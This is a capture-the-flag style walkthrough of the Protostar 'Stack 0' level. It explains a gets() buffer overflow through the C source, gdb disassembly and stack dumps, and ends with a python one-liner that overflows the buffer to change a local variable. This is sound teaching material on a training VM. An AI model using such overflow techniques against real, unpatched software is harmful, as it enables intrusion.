# Stack 0

## About

This level introduces the concept that memory can be accessed outside of
its allocated region, how the stack variables are laid out, and that modifying
outside of the allocated memory can modify program execution.

This level is at /opt/protostar/bin/stack0

    #include <stdlib.h>
    #include <unistd.h>
    #include <stdio.h>
    
    int main(int argc, char **argv)
    {
      volatile int modified;
      char buffer[64];
    
      modified = 0;
      gets(buffer);
    
      if(modified != 0) {
          printf("you have changed the 'modified' variable\n");
      } else {
          printf("Try again?\n");
      }
    }

## Program overview

This is a program written in C. It reads some input with `gets()`, then checks the modified variable and prints either a success or a fail message.

The goal of this level is to make the program print the success string.

## Solution

By executing the program we can see that it seems to wait for some input, and then prints "Try again?".

    user@protostar:/opt/protostar/bin$ ./stack0
    aaa
    Try again?

### Looking at the code

There are two local variables:  and integer number `modified` and a `char` array buffer with space for 64 characters.

    volatile int modified;
      char buffer[64];

An array of chars in C is basically just a string.

Then, `modified` will be set to `0` and apparently never changed again.

    modified = 0;

Next is the `gets` function with our 64 character long char buffer.

    gets(buffer);

If we have a look at the `gets` man page, we can see that `gets` is used to read a string from the input. When we scroll down we can also find a "Bugs" section, which is telling us to never use `gets()`.

    BUGS
           Never  use  gets().   Because  it is impossible to tell without knowing the data in advance how many characters gets() will
           read, and because gets() will continue to store characters past the end of the buffer, it is extremely  dangerous  to  use.
           It has been used to break computer security.  Use fgets() instead.
    
           It  is  not  advisable  to mix calls to input functions from the stdio library with low-level calls to read(2) for the file
           descriptor associated with the input stream; the results will be undefined and very probably not what you want.

This shows us that the vulnerability in this program is it using the `gets()` function. As an explanation it says that it's impossible to tell how many characters `gets` will read and that it has been used to break computer security.

After the gets call, `modified` is compared to `0`. If it's not `0`, we have solved the challenge. 

    if(modified != 0) {
          printf("you have changed the 'modified' variable\n");
      } else {
          printf("Try again?\n");
      }
    }

Note: `volatile` is a way to tell the compiler that it should not optimize the usage of this variable, because at first glance it looks like `modified` will always be `0` and this it might simply remove the unnecessary if-case. With `volatile` we can force the compiler to keep it as it is.

So, we have a `char` array buffer with space for 64 characters, and it's impossible to tell how many characters `gets` will read. What if we tried to input more than 64 characters?

    user@protostar:/opt/protostar/bin$ ./stack0
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    you have changed the 'modified' variable
    Segmentation fault

Solution found!!

### The stack

But lets dive deeper with `gdb` to try to fully understand what is happening.

First we set a breakpoint in `main`, then run the program from the beginning and change the disassembly flavor to `intel`.

    user@protostar:/opt/protostar/bin$ gdb ./stack0
    (gdb) break *main
    Breakpoint 1 at 0x80483f4: file stack0/stack0.c, line 6.
    (gdb) run
    (gdb) set disassembly-flavor intel
    (gdb) disassemble main
    Dump of assembler code for function main:
    0x080483f4 <main+0>:    push   ebp
    0x080483f5 <main+1>:    mov    ebp,esp
    0x080483f7 <main+3>:    and    esp,0xfffffff0
    0x080483fa <main+6>:    sub    esp,0x60
    0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
    0x08048405 <main+17>:   lea    eax,[esp+0x1c]
    0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
    0x0804840c <main+24>:   call   0x804830c <gets@plt>
    0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
    0x08048415 <main+33>:   test   eax,eax
    0x08048417 <main+35>:   je     0x8048427 <main+51>
    0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
    0x08048420 <main+44>:   call   0x804832c <puts@plt>
    0x08048425 <main+49>:   jmp    0x8048433 <main+63>
    0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
    0x0804842e <main+58>:   call   0x804832c <puts@plt>
    0x08048433 <main+63>:   leave  
    0x08048434 <main+64>:   ret    
    End of assembler dump.
    (gdb)

Lets start with the first instruction `push ebp`. 

The stack is just a memory area at the bottom. When we look at the mapped memory with `info proc mappings`, we can see that the stack goes from `0xbffeb000` to `0xc0000000`.

    (gdb) info proc mappings
    process 2062
    cmdline = '/opt/protostar/bin/stack0'
    cwd = '/opt/protostar/bin'
    exe = '/opt/protostar/bin/stack0'
    Mapped address spaces:
    
            Start Addr   End Addr       Size     Offset objfile
             0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack0
             0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack0
            0xb7e96000 0xb7e97000     0x1000          0        
            0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
            0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
            0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
            0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
            0xb7fd9000 0xb7fdc000     0x3000          0        
            0xb7fe0000 0xb7fe2000     0x2000          0        
            0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
            0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
            0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
            0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
            0xbffeb000 0xc0000000    0x15000          0           [stack]

And because the stack grows from the bottom, it starts at the highest address, so `0xc0000000`. 

`EBP` is a register which is used as the base pointer and it contains an address pointing somewhere into the stack. Whatever the meaning of this address is, it seems to be important, because it gets pushed on the stack, which is like saving the value.

At the end of the `main` function we can find a `leave`. `leave` is just basically an action that moves `ESP` to `EBP` and then pops `EBP`, making the start and end of a function symmetrical. At the start we push `EBP` and move `ESP` into `EBP`, and when the function is done we do the reverse.

After those two instructions we mask `ESP`, which basically just sets the last 4 bits to 0 to keep it nicely aligned. The, we substract `0x60` from it.

So `ESP`, the stack pointer, now points to a bit lower address than `EBP`, and the next instruction moves a  `0` at the memory location at offset `0x5c` from the stack pointer. That seems to perfectly match our `modified` variable that gets set to `0`.

After a value on te stack got set to `0`, we prepare the `eax` register with an address from the stack at offset `0x1c`. 

    lea    eax,[esp+0x1c]

`lea` (load effective address) is similar to `mov`, but instead of moving the content of an register offset into a register, it moves the address of an register offset into a register.

This address then gets placed at the top of the stack.

    mov    DWORD PTR [esp],eax

This is called "calling convention". The programs and functions have to agree on how to pass function parameters in assembler. In this case the parameters are placed on the stack and the `gets()` function takes one parameter, which points to a character buffer, and the character buffer is on the stack, thus we have to pass it the address where the character buffer starts. 

Afterwards we read the value we previously set to `0` and with `test` we can check if it is `0` or not.

    mov    eax,DWORD PTR [esp+0x5c]
    test   eax,eax

Branching off to print one of the messages.

So lets remove the breakpoint from main with `del` (delete) and set a breakpoint before and after the `gets()`.

To do that we will define a hook, that will execute some `gdb` commands when we stop at a breakpoint. To do this we type `define hook-stop`.

    (gdb) del
    Delete all breakpoints? (y or n) y
    (gdb) break *0x0804840c
    Breakpoint 3 at 0x804840c: file stack0/stack0.c, line 11.
    (gdb) break *0x08048411
    Breakpoint 4 at 0x8048411: file stack0/stack0.c, line 13.
    (gdb) define hook-stop
    Type commands for definition of "hook-stop".
    End with a line saying just "end".
    >

Then `info registers` to show the registers and `x/24wx $esp` and `x/2i $eip` and finish with `end`.

    >info registers
    >x/24wx $esp
    >x/2i $eip
    >end

This will now print the registers:

    eax            0xbffff75c       -1073744036
    ecx            0x40c79e86       1086824070
    edx            0x1      1
    ebx            0xb7fd7ff4       -1208123404
    esp            0xbffff740       0xbffff740
    ebp            0xbffff7a8       0xbffff7a8
    esi            0x0      0
    edi            0x0      0
    eip            0x804840c        0x804840c <main+24>
    eflags         0x200282 [ SF IF ID ]
    cs             0x73     115
    ss             0x7b     123
    ds             0x7b     123
    es             0x7b     123
    fs             0x0      0
    gs             0x33     51

 The stack:

    0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
    0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      0xb7eada75
    0xbffff760:     0xb7fd7ff4      0x08049620      0xbffff778      0x080482e8
    0xbffff770:     0xb7ff1040      0x08049620      0xbffff7a8      0x08048469
    0xbffff780:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7a8
    0xbffff790:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000

 And the next two instructions:

    0x804840c <main+24>:    call   0x804830c <gets@plt>
    0x8048411 <main+29>:    mov    eax,DWORD PTR [esp+0x5c]

 Every time when we hit a breakpoint.

Now we continue and enter a couple of `A`'s.

    (gdb) c
    Continuing.
    AAAAAAAAAAAAAAAAA
    eax            0xbffff75c       -1073744036
    ecx            0xbffff75c       -1073744036
    edx            0xb7fd9334       -1208118476
    ebx            0xb7fd7ff4       -1208123404
    esp            0xbffff740       0xbffff740
    ebp            0xbffff7a8       0xbffff7a8
    esi            0x0      0
    edi            0x0      0
    eip            0x8048411        0x8048411 <main+29>
    eflags         0x200246 [ PF ZF IF ID ]
    cs             0x73     115
    ss             0x7b     123
    ds             0x7b     123
    es             0x7b     123
    fs             0x0      0
    gs             0x33     51
    0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
    0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      0x41414141
    0xbffff760:     0x41414141      0x41414141      0x41414141      0x08040041
    0xbffff770:     0xb7ff1040      0x08049620      0xbffff7a8      0x08048469
    0xbffff780:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7a8
    0xbffff790:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000
    0x8048411 <main+29>:    mov    eax,DWORD PTR [esp+0x5c]
    0x8048415 <main+33>:    test   eax,eax

The `0x41`'s are all the `A`'s we have entered. Now lets see the content of the address we check if it's `0` examining `x/wx $esp+0x5c`.

    (gdb) x/wx $esp+0x5c
    0xbffff79c:     0x00000000

Its still `0`, but it shows us where it is located on the stack, and when we look at our stack...

    0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
    0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      0x41414141
    0xbffff760:     0x41414141      0x41414141      0x41414141      0x08040041
    0xbffff770:     0xb7ff1040      0x08049620      0xbffff7a8      0x08048469
    0xbffff780:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7a8
    0xbffff790:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000

We see that our `A`'s are still a little bit too far away. So we need exactly 64 + 1 characters to get to that location in the stack.

So we run the program again and type the characters.

    (gdb) c
    Continuing.
    AAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDEE
    eax            0xbffff75c       -1073744036
    ecx            0xbffff75c       -1073744036
    edx            0xb7fd9334       -1208118476
    ebx            0xb7fd7ff4       -1208123404
    esp            0xbffff740       0xbffff740
    ebp            0xbffff7a8       0xbffff7a8
    esi            0x0      0
    edi            0x0      0
    eip            0x8048411        0x8048411 <main+29>
    eflags         0x200246 [ PF ZF IF ID ]
    cs             0x73     115
    ss             0x7b     123
    ds             0x7b     123
    es             0x7b     123
    fs             0x0      0
    gs             0x33     51
    0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
    0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      0x41414141
    0xbffff760:     0x41414141      0x41414141      0x41414141      0x42414141
    0xbffff770:     0x42424242      0x42424242      0x42424242      0x43424242
    0xbffff780:     0x43434343      0x43434343      0x43434343      0x44444343
    0xbffff790:     0x44444444      0x44444444      0x44444444      0x00454544
    0x8048411 <main+29>:    mov    eax,DWORD PTR [esp+0x5c]
    0x8048415 <main+33>:    test   eax,eax

So a single step forward, and it will load the modified variable from the stack into `eax`.

    (gdb) c
    Continuing.
    you have changed the 'modified' variable

We can do this now without `gdb` and using python:

    user@protostar:/opt/protostar/bin$ python -c 'print("A"*(4+16*3+14))'
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    user@protostar:/opt/protostar/bin$ python -c 'print("A"*(4+16*3+14))' | ./stack0
    you have changed the 'modified' variable

Stack 1